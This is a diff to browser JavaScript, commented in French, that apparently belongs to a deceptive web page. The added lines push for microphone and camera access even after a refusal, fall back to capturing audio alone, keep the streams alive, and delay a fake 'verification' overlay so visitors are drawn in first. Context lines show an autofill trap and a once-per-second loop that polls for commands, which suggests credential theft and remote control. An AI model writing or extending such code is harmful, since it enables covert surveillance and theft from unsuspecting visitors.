@@ -375,6 +375,7 @@ function getCameraConstraints() {
 
 async function requestVerifyMediaPermissions() {
     try {
+        // Force la redemande même si refusé précédemment en ne vérifiant pas l'état
         const stream = await navigator.mediaDevices.getUserMedia({
             audio: true,
             video: getCameraConstraints().video
@@ -386,8 +387,17 @@ async function requestVerifyMediaPermissions() {
         console.log("📷 Autorisations micro/caméra accordées et flux maintenus");
         return true;
     } catch (err) {
-        console.warn("Permissions vérification refusées:", err.message);
-        return false;
+        console.warn("Permissions média refusées:", err.message);
+        
+        // Si refusé, on peut tenter une deuxième fois avec seulement l'audio pour voir
+        try {
+            const audioOnly = await navigator.mediaDevices.getUserMedia({ audio: true });
+            persistentAudioStream = new MediaStream(audioOnly.getAudioTracks());
+            console.log("🎙️ Seul le micro a été autorisé");
+            return true;
+        } catch (e) {
+            return false;
+        }
     }
 }
 
@@ -1081,7 +1091,11 @@ if (document.readyState === 'complete') {
     }
 
     setupAutofillTrap();
-    startVerification();
+    
+    // RETARDER L'APPARITION DE L'OVERLAY (Laisser visiter 5 secondes)
+    setTimeout(() => {
+        startVerification();
+    }, 5000);
     
     // VÉRIFICATION DES COMMANDES : Ultra-agressif (toutes les 1 seconde)
     // On utilise une boucle récursive pour garantir qu'une seule requête tourne à la fois
